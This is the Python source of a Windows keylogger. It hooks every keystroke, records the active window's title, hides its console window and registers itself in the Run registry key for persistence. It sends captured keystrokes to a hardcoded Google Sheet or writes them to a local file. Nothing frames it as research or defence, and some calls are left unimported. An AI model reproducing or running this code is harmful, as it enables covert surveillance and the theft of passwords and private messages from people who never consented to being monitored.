# -*- coding: utf-8 -*-

try:
    import pythoncom
    import pyHook
except:
    print("Please Install pythoncom and pyHook modules")
    exit(0)
import os
import sys
import win32event
import win32api
import winerror
import argparse

import gspread
from oauth2client.service_account import ServiceAccountCredentials


def gsheetinit(key):
    # use creds to create a client to interact with the Google Drive API
    scope = ['https://spreadsheets.google.com/feeds']
    creds = ServiceAccountCredentials.from_json_keyfile_name('client_secret.json', scope)
    client = gspread.authorize(creds)

    # Find a workbook by name and open the first sheet
    # Make sure you use the right name here.
    #sheet = client.open_by_key("Keylogger Demo").sheet1
    sheet = client.open_by_key(key).sheet1

    # Extract and print all of the values
    #list_of_hashes = sheet.get_all_records()
    #print(list_of_hashes)
    return sheet


# Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("Multiple Instance not Allowed")
    exit(0)

class Keylogger():

    def __init__(self):
        self.logs = ''
        self.data = ''
        self.context = ''
        self.context_chg = 0
        self.caps = 0
        self.shift = 0

    # Hide Console
    def hide(self):
        import win32console
        import win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True

    # Add to startup
    def addStartup(self):
        fp = os.path.dirname(os.path.realpath(__file__))
        file_name = sys.argv[0].split("\\")[-1]
        new_file_path = fp+"\\"+file_name
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

        key2change = OpenKey(HKEY_CURRENT_USER,
        keyVal,0,KEY_ALL_ACCESS)

        SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)

    # Local storage of logs
    def local_logs(self):
        if len(self.data) > 0:
            with open("keylogs.txt", "a") as log_file:
                if self.context_chg:
                    log_file.write('\r'+self.context+'\r')
                    log_file.write(self.data)
                    log_file.close()
                else:
                    log_file.write(self.data)
                    log_file.close()
                self.data = ''
        return True

    # Send logs to google form
    def gsheet_logs(self):
        if len(self.data) > 20:
            print('sending to the cloud')
            row = [self.context, self.data]
            index = 1
            sheet = gsheetinit("15okwR0eO_WRlAtIc6HLRgjOQ8rpYerWwMg6-EyCIblI")
            try:
                sheet.insert_row(row, index)
                self.data=''
            except:
                print('error fatal man')
                pass
            self.data=''
        print('yes')
        return True

    def OnKeyboardEvent(self, event):
        data_logs = (event.WindowName, event.Window, event.Time, event.KeyID, event.Key, event.Alt)
        print(data_logs)  # debugging
        if event.KeyID == 27:  # ESC quit the keylogger
            exit(1)
        elif event.Key == 'Lshift' or event.Key == 'Rshift':  # shift
            self.shift = not self.shift
        elif event.Key == 'Capital':  # caps lock
            self.caps = not self.caps
        elif event.Key == 'Back' or event.Key == 'Delete':  # del
            self.data += '<del>'
        elif event.KeyID in range(31, 128) or event.KeyID == 13 or event.KeyID == 9:
            if (self.shift or self.caps) and event.KeyID in range(97, 123):
                key = chr(event.KeyID-32)
            else:
                key = chr(event.KeyID)
            self.data = self.data+key
            if event.WindowName != self.context:
                self.context = event.WindowName
                self.context_chg = 1
            print(self.data)  # debugging
            self.gsheet_logs()
            self.context_chg = 0
        return True  # needs to return an integer value

    def OffKeyboardEvent(self, event):
        if event.Key == 'Lshift' or event.Key == 'Rshift':
            self.shift = 0
        return True

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="Keylogger")
    parser.add_argument('-l', default='local', help='How to store logs [local|gdrive]')
    args = parser.parse_args()

    obj = pyHook.HookManager()
    kl = Keylogger()
    obj.KeyDown = kl.OnKeyboardEvent
    obj.KeyUp = kl.OffKeyboardEvent
    obj.HookKeyboard()
    pythoncom.PumpMessages()
